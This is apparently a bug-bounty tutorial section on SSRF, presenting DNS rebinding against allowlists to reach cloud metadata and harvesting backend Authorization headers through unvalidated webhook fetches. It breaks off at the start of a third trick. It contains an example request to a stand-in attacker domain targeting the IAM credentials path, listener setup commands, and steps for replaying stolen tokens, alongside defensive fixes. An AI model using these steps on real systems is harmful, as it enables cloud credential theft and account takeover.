# 🌐 SSRF & Cloud (Tricks #7–#13)

> ⚠️ Disclaimer: Educational use only. Only test in-scope assets you are
> authorized to test. Never touch systems without explicit written permission.

SSRF remains one of the highest-paid bug classes because it chains directly
into cloud credential theft. The tricks below cover modern bypasses,
DNS rebinding, IMDSv2 evasion, and non-HTTP protocols that filters forget.

---

## Table of Contents

1. [DNS Rebinding to Bypass SSRF Allowlists](#trick-7)
2. [Steal Backend Authorization Headers via Unvalidated Webhooks](#trick-8)
3. [IMDSv2 Bypass Using an External Redirector](#trick-9)
4. [Bypass SSRF Filters with IPv6, Decimal, and Octal IPs](#trick-10)
5. [Exploit PDF/Thumbnail Generators for Blind SSRF](#trick-11)
6. [Access Cloud Metadata via file/gopher/dict](#trick-12)
7. [Force SSRF Through XML Parsers (XXE → SSRF)](#trick-13)

---

<a name="trick-7"></a>
## 🧩 Trick #7 — DNS Rebinding to Bypass SSRF Allowlists

Category: SSRF
Impact: Critical
Tools: dnsFookup, rebind.network, custom DNS server

### The Idea
The target resolves your domain at validation time and sees a benign IP
that passes the allowlist. Moments later, when the backend actually fetches
the URL, the DNS record has flipped to 169.254.169.254 (cloud metadata).
The validation was on the wrong resolution.

### Steps

1. Set up a rebinding DNS server (e.g., [dnsFookup](https://github.com/makuga/dnsFookup)) with TTL 0.

2. Configure responses:
   - First N queries: 1.2.3.4 (benign, allowlisted)
   - Subsequent queries: 169.254.169.254 (metadata)

3. Submit your domain as the URL in the vulnerable parameter:
  
   url=http://rebind.attacker.com/latest/meta-data/iam/security-credentials/
   
4. Race the resolution:
   - First call → passes allowlist check
   - Second call (fetch) → hits metadata

5. Capture credentials in your listener.

### Why It Works
- Validation and fetch happen at different times.
- Many filters only check the hostname, not the resolved IP at fetch time.
- TTL 0 forces re-resolution on every request.

### Fix
- Resolve once, pin the IP for the request.
- Block link-local (169.254.0.0/16) and private ranges at egress.
- Enforce IMDSv2 with hop limit = 1.

### References
- [AWS IMDS documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)

---

<a name="trick-8"></a>
## 🧩 Trick #8 — Steal Backend Authorization Headers via Unvalidated Webhooks

Category: SSRF
Impact: Critical (token leakage → account takeover)
Tools: interactsh, ngrok, Burp Collaborator

### The Idea
When a service fetches a user-supplied URL (PDF generator, webhook tester,
repo importer, avatar fetcher), the backend often attaches its **own
Authorization header** to the outbound request. If the destination isn't
validated, you point it at your server and harvest the token.

### Steps

1. Find a URL-fetching feature:
   - PDF/preview generator
   - Webhook test button
   - Avatar-from-URL
   - Repo/import from Git URL
   - RSS/feed subscriber
   - Slack/Microsoft Teams integration preview

2. Spin up a listener:
  
   interactsh-client
   # or
   python3 -m http.server 8000
   
3. Supply your listener URL in the feature.

4. Inspect incoming headers:
  
   Authorization: Bearer eyJ...
   Cookie: session=...
   X-API-Key: ...
   
5. Replay the token against the app's API — often grants admin or
   internal-service access.

### Why It Works
Backend integrations frequently attach their service account token to
outbound requests, assuming the destination is trusted. When the destination
is user-controlled, the token leaks.

### Fix
- Strip sensitive headers on outbound requests.
- Allowlist destination domains.
- Use per-destination scoped tokens.
- Never attach internal auth to user-supplied URLs.

---

<a name="trick-9"></a>
## 🧩 Trick #9 — IMDSv2 Bypass Using an External Redirector

Category: SSRF
Impact: Critical
Tools: Your own HTTP server, curl